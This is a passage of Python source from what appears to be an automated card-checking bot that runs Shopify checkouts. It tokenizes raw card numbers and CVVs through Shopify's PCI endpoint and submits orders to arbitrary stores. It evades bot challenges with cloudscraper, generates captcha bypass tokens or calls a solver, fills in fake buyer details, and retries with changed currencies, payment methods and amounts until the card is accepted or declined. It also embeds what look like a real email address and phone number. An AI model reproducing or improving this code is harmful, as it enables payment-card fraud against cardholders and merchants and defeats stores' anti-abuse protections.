                            if not stable_id and robust2.get("stable_id"):
                                stable_id = robust2["stable_id"]
                            if not paymentMethodIdentifier:
                                paymentMethodIdentifier = _capture_multi(checkout_text, ('paymentMethodIdentifier&quot;:&quot;', '&quot;'), ('paymentMethodIdentifier":"', '"')) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
                            logger.info(f"Checkout tokens via diagnostic-style fetch for {url}")
                            break
                    except Exception:
                        continue

            # Last-resort: cloudscraper full flow (collagesoup, stickerdad - session may get challenge page)
            if (not x_checkout_one_session_token or not token or not queue_token or not stable_id) and product_id is not None and HAS_CLOUDSCRAPER:
                try:
                    cs_sc, cs_text, cs_url = await asyncio.to_thread(
                        _fetch_checkout_via_cloudscraper_full_flow_sync, url, product_id, proxy
                    )
                    if cs_sc == 200 and cs_text and len(cs_text) > 3000 and ("serialized-sessionToken" in cs_text or "serialized-sourceToken" in cs_text):
                        checkout_text = cs_text
                        checkout_lower = checkout_text.lower()
                        x_checkout_one_session_token = _extract_session_token(checkout_text) or x_checkout_one_session_token
                        robust2 = _extract_checkout_tokens_robust(checkout_text)
                        if not x_checkout_one_session_token:
                            x_checkout_one_session_token = robust2.get("session_token")
                        if not token:
                            token = robust2.get("source_token")
                        if not queue_token:
                            queue_token = robust2.get("queue_token")
                        if not stable_id:
                            stable_id = robust2.get("stable_id")
                        if not paymentMethodIdentifier:
                            paymentMethodIdentifier = _capture_multi(checkout_text, ('paymentMethodIdentifier&quot;:&quot;', '&quot;'), ('paymentMethodIdentifier":"', '"')) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
                        if cs_url:
                            checkout_url = cs_url
                        logger.info(f"Checkout tokens via last-resort cloudscraper full flow for {url}")
                except Exception as e:
                    logger.debug(f"Last-resort cloudscraper full flow: {e}")
            # Last-resort: full diagnostic flow (cart/add -> POST /checkout -> GET redirect) to get same page as /testsh.
            if (not x_checkout_one_session_token or not token or not queue_token or not stable_id) and product_id is not None:
                try:
                    add_h = {
                        "User-Agent": getua,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Origin": url.rstrip("/"),
                        "Referer": url.rstrip("/") + "/",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    }
                    add_r = await session.post(
                        f"{url.rstrip('/')}/cart/add",
                        headers=add_h,
                        data={"id": product_id, "quantity": 1},
                        timeout=15,
                        follow_redirects=True,
                    )
                    if add_r and getattr(add_r, "status_code", 0) in (200, 302):
                        await asyncio.sleep(0.6)
                        ch_post = await session.post(
                            f"{url.rstrip('/')}/checkout",
                            headers={
                                "User-Agent": getua,
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Origin": url.rstrip("/"),
                                "Referer": url.rstrip("/") + "/",
                                "Accept": "*/*",
                            },
                            data="",
                            timeout=18,
                            follow_redirects=False,
                        )
                        post_sc = getattr(ch_post, "status_code", 0)
                        if post_sc in (301, 302, 303, 307, 308):
                            loc = (getattr(ch_post, "headers", None) or {}).get("location") or (getattr(ch_post, "headers", None) or {}).get("Location") or ""
                            if loc:
                                if not loc.startswith("http"):
                                    loc = urljoin(url.rstrip("/") + "/", loc)
                                get_final = await session.get(loc, headers=checkout_headers, follow_redirects=True, timeout=22)
                                _final_sc = getattr(get_final, "status_code", 0)
                                final_text = (getattr(get_final, "text", None) or "").strip()
                                logger.info(
                                    "[last-resort] GET %.80s status=%s len=%s has_session_meta=%s",
                                    loc or "", _final_sc, len(final_text), "serialized-sessionToken" in final_text,
                                )
                                if _final_sc == 200 and final_text and len(final_text) > 5000 and ("serialized-sessionToken" in final_text or "serialized-session-token" in final_text or "serializedSessionToken" in final_text):
                                        checkout_text = final_text
                                        checkout_lower = checkout_text.lower()
                                        x_checkout_one_session_token = _extract_session_token(checkout_text) or x_checkout_one_session_token
                                        robust2 = _extract_checkout_tokens_robust(checkout_text)
                                        if not x_checkout_one_session_token:
                                            x_checkout_one_session_token = robust2.get("session_token")
                                        if not token:
                                            token = robust2.get("source_token")
                                        if not queue_token:
                                            queue_token = robust2.get("queue_token")
                                        if not stable_id:
                                            stable_id = robust2.get("stable_id")
                                        if not paymentMethodIdentifier:
                                            paymentMethodIdentifier = _capture_multi(checkout_text, ('paymentMethodIdentifier&quot;:&quot;', '&quot;'), ('paymentMethodIdentifier":"', '"')) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
                                        logger.info(f"Checkout tokens via last-resort diagnostic flow for {url}")
                except Exception:
                    pass

            missing = []
            if not x_checkout_one_session_token:
                missing.append("session_token")
            if not token:
                missing.append("source_token")
            if not queue_token:
                missing.append("queue_token")
            if not stable_id:
                missing.append("stable_id")
            if missing:
                # Fallback: if page has tokens as raw text, try JSON extraction (handles different encodings)
                if checkout_text and ("queueToken" in checkout_text or "stableId" in checkout_text):
                    try:
                        deep = _extract_tokens_from_page_json(checkout_text)
                        if not queue_token and deep.get("queue_token"):
                            queue_token = deep["queue_token"]
                        if not stable_id and deep.get("stable_id"):
                            stable_id = deep["stable_id"]
                        missing = [m for m in missing if not ((m == "queue_token" and queue_token) or (m == "stable_id" and stable_id))]
                    except Exception:
                        pass
                if missing:
                    output.update({
                        "Response": f"CHECKOUT_TOKENS_MISSING ({','.join(missing)})",
                        "Status": False,
                    })
                    _log_output_to_terminal(output)
                    return output

        try:
            tax1 = capture(checkout_text, "totalTaxAndDutyAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;", "&quot")
        except Exception:
            tax1 = None
        # Extract checkout total from page for payment amount (avoids PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT)
        # runningTotal has exact amount + currency (e.g. 200.0 INR, 2.5 USD) - use for both payment and buyer identity
        running_total_amt, running_total_curr = _extract_running_total_and_currency(checkout_text)
        checkout_total_str = None
        if running_total_amt:
            checkout_total_str = running_total_amt
        if not checkout_total_str:
            try:
                checkout_total_str = _capture_multi(
                    checkout_text,
                    ('runningTotal&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot'),
                    ('"runningTotal":{"value":{"amount":"', '"'),
                    ('checkoutTotal&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot'),
                    ('"checkoutTotal":{"value":{"amount":"', '"'),
                    ('totalAmountToPay&quot;:{&quot;amount&quot;:&quot;', '&quot'),
                    ('"totalAmountToPay":{"amount":"', '"'),
                )
            except Exception:
                pass
        try:
            gateway = _capture_multi(checkout_text, ('extensibilityDisplayName&quot;:&quot;', '&quot'), ('extensibilityDisplayName":"', '"')) or capture(checkout_text, 'extensibilityDisplayName&quot;:&quot;', '&quot')
        except Exception:
            gateway = None
        if gateway == "Shopify Payments":
            gateway = "Normal"
        elif gateway:
            gateway = gateway
        else:
            gateway = "Unknown"
        DMT = capture(checkout_text, 'deliveryMethodTypes&quot;:[&quot;', '&quot;],&quot;')

        # When checkout URL has en-in (India locale), use IN for address to match store (tiefossi DELIVERY_LINE_DETAIL)
        addr_country = countryCode
        if checkout_url and ("en-in" in (checkout_url or "").lower() or "en_in" in (checkout_url or "").lower()):
            addr_country = "IN"
        addr = pick_addr(url, cc=currencyCode, rc=addr_country)
        # print(addr["postalCode"])
        # print(addr["address1"])
        # print(addr["city"])
        # print(addr["zoneCode"])
        # print(addr["phone"])
        # print(addr["countryCode"])
        # print(addr["currencyCode"])

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'priority': 'u=1, i',
            'referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html?identifier=&locationURL=',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'none',
            'sec-gpc': '1',
            'user-agent': f'{getua}',
        }
        json_data = {
            'credit_card': {
                'number': cc,
                'month': mes,
                'year': ano,
                'verification_value': cvv,
                'start_month': None,
                'start_year': None,
                'issue_number': '',
                'name': 'maxine df',
            },
            'payment_session_scope': domain,
        }

        # PCI sessions - tokenize card
        request = await session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data, timeout=18)
        sess_sc = getattr(request, "status_code", 0)
        sess_text = (getattr(request, "text", None) or "").strip()
        session_id = None
        if sess_sc == 200 and sess_text:
            try:
                sess_json = json.loads(sess_text) if sess_text.startswith("{") else {}
                session_id = (sess_json.get("id") or "").strip() if isinstance(sess_json, dict) else None
            except Exception:
                pass
        if not session_id:
            err_msg = "SESSION_ID_MISSING"
            if sess_sc != 200:
                err_msg = f"PCI_SESSION_HTTP_{sess_sc}"
            elif sess_text and ("invalid" in sess_text.lower() or "error" in sess_text.lower()):
                try:
                    j = json.loads(sess_text)
                    err_msg = (j.get("message") or j.get("error") or err_msg)[:60]
                except Exception:
                    pass
            output.update({"Response": err_msg, "Status": False})
            _log_output_to_terminal(output)
            return output

        # price1/currency for SubmitForCompletion (non-shipping from API, else from page)
        price1_str = str(price or "0").replace(",", ".")
        if "." in price1_str:
            try:
                price1_str = f"{float(price1_str):.2f}"
            except Exception:
                pass
        if non_shipping_flow and low_product:
            price1_str = (low_product.get("price1") or low_product.get("formatted_price") or price1_str)
            if isinstance(price1_str, str) and "$" in price1_str:
                price1_str = price1_str.replace("$", "").strip()
        # Currency: runningTotal from page is authoritative (matches payment amount exactly)
        curr_code = (running_total_curr or currencyCode or (low_product.get("currency_code") if low_product else None) or "USD").strip()
        country_code_val = (countryCode or (low_product.get("country_code") if low_product else None) or "US").strip()
        if checkout_url and ("en-in" in (checkout_url or "").lower() or "en_in" in (checkout_url or "").lower()):
            country_code_val = "IN"
        # Use page presentment currency for buyerIdentity - must match checkout session (tiefossi: BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH)
        # presentment_currency_page is from buyerIdentity in page; running_total_curr from runningTotal - prefer page's explicit presentmentCurrency
        api_currency = (low_product.get("currency_code") or "").strip() if low_product else ""
        locale_currency = None
        if checkout_url and not running_total_curr:
            url_lower = (checkout_url or "").lower()
            if "/en-in" in url_lower or "en-in" in url_lower:
                locale_currency = "INR"
            elif "/en-gb" in url_lower or "en-gb" in url_lower:
                locale_currency = "GBP"
            elif "/de" in url_lower or "en-de" in url_lower or "/eu/" in url_lower:
                locale_currency = "EUR"
        buyer_presentment = (presentment_currency_page or running_total_curr or locale_currency or api_currency or curr_code).strip()
        # Payment amount: prefer checkout total from page (exact format from runningTotal) to avoid PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT
        payment_amount_str = price1_str
        if running_total_amt:
            payment_amount_str = running_total_amt  # Use exact format from page (e.g. 200.0, 1.19)
        elif checkout_total_str:
            try:
                v = float(str(checkout_total_str).replace(",", ".").strip())
                if v > 0:
                    payment_amount_str = f"{v:.2f}"
            except Exception:
                pass
        # For shipping products, if no total from page, add buffer for shipping (product + ~$5)
        if not checkout_total_str and not non_shipping_flow:
            try:
                pv = float(str(price1_str).replace(",", "."))
                payment_amount_str = f"{max(pv + 5.0, pv * 1.5):.2f}"
            except Exception:
                pass
        variant_id_submit = product_id
        if isinstance(variant_id_submit, str) and variant_id_submit.isdigit():
            variant_id_submit = int(variant_id_submit)

        # Build SubmitForCompletion delivery block: NONE for non-shipping, else any
        if non_shipping_flow:
            # For NONE/digital products: deliveryStrategyMatchingConditions works; handle can cause "invalid value"
            sel_strat = {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}
            logger.info(f"Non-shipping: using deliveryStrategyMatchingConditions")
            delivery_payload = {
                "deliveryLines": [{
                    "selectedDeliveryStrategy": sel_strat,
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "deliveryMethodTypes": ["NONE"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True,
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True,
            }
        else:
            dmt_list = [DMT] if (DMT and isinstance(DMT, str)) else ["SHIPPING", "LOCAL"]
            dest_addr = {
                "streetAddress": {
                    "address1": addr.get("address1", "123 Main St"),
                    "city": addr.get("city", "New York"),
                    "countryCode": addr.get("countryCode", "US"),
                    "postalCode": addr.get("postalCode", "10080"),
                    "firstName": "Test",
                    "lastName": "Buyer",
                    "zoneCode": addr.get("zoneCode", "NY"),
                    "phone": addr.get("phone", "12195551234"),
                },
            }
            delivery_payload = {
                "deliveryLines": [{
                    "destination": dest_addr,
                    "selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}},
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "deliveryMethodTypes": dmt_list,
                    "expectedTotalPrice": {"value": {"amount": payment_amount_str, "currencyCode": curr_code}} if payment_amount_str and curr_code else {"any": True},
                    "destinationChanged": True,
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True,
            }

        # Captcha token: try bypass first; retry with solver on CAPTCHA_TOKEN_MISSING
        captcha_token = None
        if CAPTCHA_SOLVER_AVAILABLE:
            try:
                bypass = generate_bypass_data(checkout_url or f"{url.rstrip('/')}/checkout", x_checkout_one_session_token or "")
                captcha_token = (bypass.get("token") or "").strip() if isinstance(bypass, dict) else None
            except Exception:
                pass

        submit_vars = {
            "input": {
                "sessionInput": {"sessionToken": x_checkout_one_session_token},
                "queueToken": queue_token,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": delivery_payload,
                "deliveryExpectations": {"deliveryExpectationLines": []},
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {
                            "productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id_submit}", "variantId": f"gid://shopify/ProductVariant/{variant_id_submit}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None},
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {"amount": payment_amount_str, "currencyCode": curr_code}} if payment_amount_str and curr_code else {"any": True},
                        "lineComponentsSource": None,
                        "lineComponents": [],
                    }],
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": paymentMethodIdentifier,
                                "sessionId": session_id,
                                "billingAddress": {
                                    "streetAddress": {"address1": addr.get("address1", "7 street"), "city": addr.get("city", "california"), "countryCode": addr.get("countryCode", "US"), "postalCode": addr.get("postalCode", "90001"), "firstName": "Tarun", "lastName": "S", "zoneCode": addr.get("zoneCode", "CA"), "phone": addr.get("phone", "16125626619")},
                                },
                                "cardSource": None,
                            },
                            "giftCardPaymentMethod": None,
                            "redeemablePaymentMethod": None,
                            "walletPaymentMethod": None,
                            "walletsPlatformPaymentMethod": None,
                            "localPaymentMethod": None,
                            "paymentOnDeliveryMethod": None,
                            "paymentOnDeliveryMethod2": None,
                            "manualPaymentMethod": None,
                            "customPaymentMethod": None,
                            "offsitePaymentMethod": None,
                            "customOnsitePaymentMethod": None,
                            "deferredPaymentMethod": None,
                            "customerCreditCardPaymentMethod": None,
                            "paypalBillingAgreementPaymentMethod": None,
                            "remotePaymentInstrument": None,
                        },
                        "amount": {"value": {"amount": payment_amount_str, "currencyCode": curr_code}},
                    }],
                },
                "buyerIdentity": {"customer": {"presentmentCurrency": buyer_presentment, "countryCode": country_code_val}, "email": "mass652004@gmail.com", "emailChanged": False, "phoneCountryCode": country_code_val, "marketingConsent": [], "shopPayOptInPhone": {"number": "16125626619", "countryCode": country_code_val}, "rememberMe": False},
                "tip": {"tipLines": []},
                "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": curr_code}}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None},
                "note": {"message": None, "customAttributes": [{"key": "__route_cart_id", "value": "7b0327c1-b18b-4490-9850-d4f3e6ee555a"}]},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                "optionalDuties": {"buyerRefusesDuties": False},
                "captcha": {"provider": "hcaptcha", "challenge": "comparison_challenge_type", "token": captcha_token or ""},
                "cartMetafields": [],
            },
            "attemptToken": token or "",
            "metafields": [],
            "analytics": {"requestUrl": checkout_url or f"{url.rstrip('/')}/checkout", "pageId": "97cf2a68-FFBC-4F9E-A74F-EA7F7448727E"},
        }

        # receipt is a union - must use inline fragments, cannot select directly
        SUBMIT_QUERY = (
            'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){'
            '...on SubmitSuccess{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}...on WaitingReceipt{id __typename}...on FailedReceipt{id __typename}__typename}__typename}'
            '...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}...on WaitingReceipt{id __typename}...on FailedReceipt{id __typename}__typename}__typename}'
            '...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}...on WaitingReceipt{id __typename}...on FailedReceipt{id __typename}__typename}__typename}'
            '...on SubmitFailed{reason __typename}'
            '...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}'
            '...on Throttled{pollAfter pollUrl __typename}'
            '__typename}}'
        )
        submit_headers = {
            "user-agent": getua,
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json",
            "shopify-checkout-source": f'id="{token}", type="cn"' if token else "",
            "x-checkout-one-session-token": x_checkout_one_session_token or "",
            "x-checkout-web-build-id": "ca6309a150c7e1f99afc334acc0190c532a90e11",
            "x-checkout-web-deploy-stage": "production",
            "x-checkout-web-server-handling": "fast",
            "x-checkout-web-server-rendering": "no",
            "x-checkout-web-source-id": token or "",
        }
        # GraphQL always uses store domain (url) - shop.app is only for page fetch; API lives on store
        submit_url = f"{url.rstrip('/')}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
        poll_url = f"{url.rstrip('/')}/checkouts/unstable/graphql?operationName=PollForReceipt"
        submit_resp = None
        submit_sc = 0
        submit_text = ""
        bill = None
        submit_typename = None
        payment_amount_retry = payment_amount_str
        for submit_attempt in range(3):
            # Update payment amount for retries (PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT)
            pl = (submit_vars.get("input") or {}).get("payment") or {}
            plines = pl.get("paymentLines") or []
            if plines and isinstance(plines[0], dict):
                plines[0]["amount"] = {"value": {"amount": payment_amount_retry, "currencyCode": curr_code}}
            try:
                submit_resp = await session.post(submit_url, json={"query": SUBMIT_QUERY, "variables": submit_vars, "operationName": "SubmitForCompletion"}, headers=submit_headers, timeout=25)
            except Exception as e:
                output.update({"Response": f"SUBMIT_REQUEST_ERROR: {str(e)[:50]}", "Status": False})
                _log_output_to_terminal(output)
                return output
            submit_sc = getattr(submit_resp, "status_code", 0)
            submit_text = (getattr(submit_resp, "text", None) or "").strip()
            if submit_sc == 200 and submit_text and submit_text.startswith("{"):
                try:
                    submit_data = json.loads(submit_text)
                    data_node = submit_data.get("data") or {}
                    sfc = data_node.get("submitForCompletion") or {}
                    submit_typename = (sfc.get("__typename") or "")
                    if submit_typename in ("SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"):
                        rec = sfc.get("receipt")
                        if isinstance(rec, dict):
                            bill = (rec.get("id") or "").strip()
                    elif submit_typename == "SubmitFailed":
                        reason = (sfc.get("reason") or "").strip() or "SUBMIT_FAILED"
                        output.update({"Response": reason[:80], "Status": False, "Price": price1_str, "Gateway": gateway or "Shopify"})
                        _log_output_to_terminal(output)
                        return output
                    elif submit_typename == "SubmitRejected":
                        errs = sfc.get("errors") or []
                        code = "CARD_DECLINED"
                        if errs and isinstance(errs[0], dict):
                            code = (errs[0].get("code") or errs[0].get("localizedMessage") or code)[:60]
                        # Retry with captcha solver on CAPTCHA_TOKEN_MISSING / CAPTCHA (collagesoup, etc.)
                        if ("CAPTCHA" in (code or "").upper() or "CAPTCHA_TOKEN" in (code or "")) and submit_attempt < 2 and CAPTCHA_SOLVER_AVAILABLE:
                            try:
                                from BOT.helper.shopify_captcha_solver import solve_shopify_captcha
                                result = await solve_shopify_captcha(checkout_url or f"{url.rstrip('/')}/checkout", x_checkout_one_session_token or "", "shopify", timeout=15)
                                if result and getattr(result, "token", None):
                                    captcha_token = result.token
                                    submit_vars["input"]["captcha"]["token"] = captcha_token or ""
                                    await asyncio.sleep(0.5)
                                    continue
                            except Exception as e:
                                logger.debug(f"Captcha solver SubmitRejected: {e}")
                        # Re-fetch checkout on MERCHANDISE_CART_UPDATED_BASED_ON_COUNTRY or DELIVERY_DELIVERY_LINE_DETAIL_CHANGED - state changed, need fresh tokens (tiefossi, etc.)
                        if any(x in (code or "") for x in ["MERCHANDISE_CART_UPDATED_BASED_ON_COUNTRY", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED"]) and submit_attempt < 3 and checkout_url:
                            try:
                                await asyncio.sleep(2.0)  # Give store time to update cart
                                fresh_text = None
                                # Try session.get first; for low_product_flow, session may lack checkout cookies -> use cloudscraper
                                for _ref in range(2):
                                    refetch = await session.get(checkout_url, headers={"User-Agent": getua, "Accept": "text/html,application/xhtml+xml,*/*;q=0.9"}, timeout=25)
                                    if getattr(refetch, "status_code", 0) == 200 and getattr(refetch, "text", None):
                                        fresh_text = (refetch.text or "").strip()
                                    if fresh_text and len(fresh_text) > 5000 and "queueToken" in fresh_text and "stableId" in fresh_text:
                                        break
                                    # Low-product flow: session may not have checkout cookies; use cloudscraper full flow
                                    if low_product_flow and HAS_CLOUDSCRAPER and (low_product or {}).get("variantid"):
                                        vid = low_product.get("variantid")
                                        cs_sc, cs_text, cs_url = await asyncio.to_thread(_fetch_checkout_via_cloudscraper_full_flow_sync, url, vid, proxy)
                                        if cs_sc == 200 and cs_text and len(cs_text) > 5000 and "queueToken" in cs_text and "stableId" in cs_text:
                                            fresh_text = cs_text.strip()
                                            if cs_url:
                                                checkout_url = cs_url
                                            break
                                    await asyncio.sleep(1.5)
                                if fresh_text and len(fresh_text) > 5000 and "queueToken" in fresh_text and "stableId" in fresh_text:
                                        checkout_text = fresh_text
                                        new_sess = _extract_session_token(fresh_text)
                                        if new_sess:
                                            x_checkout_one_session_token = new_sess
                                            # Cloudscraper refetch = new checkout; create new PCI session
                                            try:
                                                pci_r = await session.post(
                                                    "https://checkout.pci.shopifyinc.com/sessions",
                                                    headers={
                                                        "accept": "application/json",
                                                        "content-type": "application/json",
                                                        "origin": "https://checkout.pci.shopifyinc.com",
                                                        "user-agent": getua,
                                                    },
                                                    json={
                                                        "credit_card": {"number": cc, "month": mes, "year": ano, "verification_value": cvv, "start_month": None, "start_year": None, "issue_number": "", "name": "maxine df"},
                                                        "payment_session_scope": (domain or (urlparse(url).netloc or "").replace("www.", "")),
                                                    },
                                                    timeout=18,
                                                )
                                                if getattr(pci_r, "status_code", 0) == 200 and getattr(pci_r, "text", None):
                                                    pj = json.loads(pci_r.text) if (pci_r.text or "").strip().startswith("{") else {}
                                                    session_id = (pj.get("id") or "").strip() or session_id
                                                    _pl = (submit_vars.get("input") or {}).get("payment") or {}
                                                    _plines = _pl.get("paymentLines") or []
                                                    if _plines and isinstance(_plines[0], dict):
                                                        _dm = (_plines[0].get("paymentMethod") or {}).get("directPaymentMethod") or {}
                                                        if _dm is not None:
                                                            _dm["sessionId"] = session_id
                                            except Exception:
                                                pass
                                        submit_vars["input"]["sessionInput"] = {"sessionToken": x_checkout_one_session_token}
                                        queue_token = _capture_multi(fresh_text, ('queueToken&quot;:&quot;', '&quot'), ('queueToken":"', '"')) or queue_token
                                        stable_id = _capture_multi(fresh_text, ('stableId&quot;:&quot;', '&quot'), ('stableId":"', '"')) or stable_id
                                        presentment_currency_page = _capture_multi(fresh_text, ('presentmentCurrency&quot;:&quot;', '&quot'), ('presentmentCurrency":"', '"')) or presentment_currency_page
                                        country_from_page = _capture_multi(fresh_text, ('countryCode&quot;:&quot;', '&quot'), ('countryCode":"', '"')) or None
                                        running_total_amt, running_total_curr = _extract_running_total_and_currency(fresh_text)
                                        if running_total_amt:
                                            payment_amount_retry = running_total_amt
                                        if presentment_currency_page or running_total_curr:
                                            buyer_presentment = (presentment_currency_page or running_total_curr or buyer_presentment).strip()
                                        _bi = (submit_vars.get("input") or {}).get("buyerIdentity") or {}
                                        _cust = _bi.get("customer") or {}
                                        if _cust:
                                            _cust["presentmentCurrency"] = buyer_presentment
                                            if country_from_page and len(country_from_page) == 2:
                                                cc_up = country_from_page.upper()
                                                _cust["countryCode"] = cc_up
                                                country_code_val = cc_up
                                                _bi["phoneCountryCode"] = cc_up
                                                _shop = _bi.get("shopPayOptInPhone") or {}
                                                if isinstance(_shop, dict):
                                                    _shop["countryCode"] = cc_up
                                                    _bi["shopPayOptInPhone"] = _shop
                                        if curr_code and running_total_curr:
                                            curr_code = running_total_curr
                                        submit_vars["input"]["queueToken"] = queue_token
                                        _ml = (submit_vars.get("input") or {}).get("merchandise") or {}
                                        _mlines = _ml.get("merchandiseLines") or []
                                        if _mlines and stable_id:
                                            _mlines[0]["stableId"] = stable_id
                                            if payment_amount_retry and curr_code:
                                                _mlines[0]["expectedTotalPrice"] = {"value": {"amount": payment_amount_retry, "currencyCode": curr_code}}
                                        _del = (submit_vars.get("input") or {}).get("delivery") or {}
                                        _dlines = _del.get("deliveryLines") or []
                                        if _dlines and stable_id:
                                            _dlines[0]["targetMerchandiseLines"] = {"lines": [{"stableId": stable_id}]}
                                            if payment_amount_retry and curr_code and not non_shipping_flow:
                                                _dlines[0]["expectedTotalPrice"] = {"value": {"amount": payment_amount_retry, "currencyCode": curr_code}}
                                        _pl = (submit_vars.get("input") or {}).get("payment") or {}
                                        _plines = _pl.get("paymentLines") or []
                                        if _plines and payment_amount_retry and curr_code:
                                            _plines[0]["amount"] = {"value": {"amount": payment_amount_retry, "currencyCode": curr_code}}
                                        logger.info("Re-fetched checkout for MERCHANDISE_CART/DELIVERY_LINE_DETAIL_CHANGED")
                                        continue
                            except Exception as e:
                                logger.debug(f"MERCHANDISE_CART re-fetch: {e}")
                        # Retry with alternate presentment currency on BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH (tiefossi, etc.)
                        if "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH" in (code or "") and submit_attempt < 2:
                            alt_curr = "INR" if (buyer_presentment or "").upper() == "USD" else "USD"
                            buyer_presentment = alt_curr
                            _bi = (submit_vars.get("input") or {}).get("buyerIdentity") or {}
                            _cust = _bi.get("customer") or {}
                            _cust["presentmentCurrency"] = alt_curr
                            await asyncio.sleep(0.3)
                            continue
                        # Retry with next payment method on INVALID_PAYMENT_METHOD (stickerdad, etc.)
                        if "INVALID_PAYMENT_METHOD" in (code or "") and payment_method_ids and len(payment_method_ids) > 1:
                            current_idx = payment_method_ids.index(paymentMethodIdentifier) if (paymentMethodIdentifier and paymentMethodIdentifier in payment_method_ids) else -1
                            if current_idx + 1 < len(payment_method_ids):
                                next_pm = payment_method_ids[current_idx + 1]
                                paymentMethodIdentifier = next_pm
                                _pl = (submit_vars.get("input") or {}).get("payment") or {}
                                _plines = _pl.get("paymentLines") or []
                                if _plines and isinstance(_plines[0], dict):
                                    _dm = (_plines[0].get("paymentMethod") or {}).get("directPaymentMethod") or {}
                                    if _dm is not None:
                                        _dm["paymentMethodIdentifier"] = next_pm
                                await asyncio.sleep(0.3)
                                continue
                        # Retry on WAITING_PENDING_TERMS (server still computing; wait and retry once)
                        if "WAITING_PENDING_TERMS" in (code or "") and submit_attempt == 0:
                            await asyncio.sleep(2.0)
                            continue
                        # Retry with higher amount on PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT
                        if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in (code or "") and submit_attempt < 2:
                            try:
                                pv = float(str(payment_amount_retry).replace(",", "."))
                                payment_amount_retry = f"{max(pv * 2, pv + 10.0):.2f}"
                                await asyncio.sleep(0.3)
                                continue
                            except Exception:
                                pass
                        output.update({"Response": code, "Status": False, "Price": price1_str, "Gateway": gateway or "Shopify"})
                        _log_output_to_terminal(output)
                        return output
                    elif submit_typename == "Throttled":
                        poll_after = sfc.get("pollAfter") or 2
                        await asyncio.sleep(min(float(poll_after), 5.0))
                        continue
                    if not bill and submit_data.get("errors"):
                        err_list = submit_data.get("errors", [])
                        first_msg = (err_list[0].get("message") or str(err_list[0]))[:80] if err_list else ""
                        if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in first_msg and submit_attempt < 2:
                            try:
                                pv = float(str(payment_amount_retry).replace(",", "."))
                                payment_amount_retry = f"{max(pv * 2, pv + 10.0):.2f}"
                                await asyncio.sleep(0.3)
                                continue
                            except Exception:
                                pass
                        if "CAPTCHA_TOKEN_MISSING" in first_msg and submit_attempt == 0 and CAPTCHA_SOLVER_AVAILABLE:
                            try:
                                from BOT.helper.shopify_captcha_solver import solve_shopify_captcha
                                result = await solve_shopify_captcha(checkout_url or f"{url.rstrip('/')}/checkout", x_checkout_one_session_token or "", "shopify", timeout=15)
